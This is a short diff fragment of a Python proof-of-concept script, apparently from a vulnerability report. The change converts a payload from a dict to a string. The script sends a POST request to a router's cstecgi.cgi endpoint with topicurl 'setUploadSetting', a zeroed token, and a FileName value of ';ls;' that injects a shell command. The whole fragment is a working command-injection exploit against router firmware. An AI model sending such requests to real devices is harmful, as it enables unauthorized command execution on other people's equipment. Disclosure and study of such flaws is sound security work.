@@ -17,11 +17,11 @@ import requests
 
 url = "http://192.168.0.1/cgi-bin/cstecgi.cgi"
 
-payload = {
+payload = """{
     "FileName":";ls;",
     "topicurl":"setUploadSetting",
     "token":"00000000000000000000000000000000"
-}
+}"""
 
 requests.request("POST", url, data=payload)
 ```
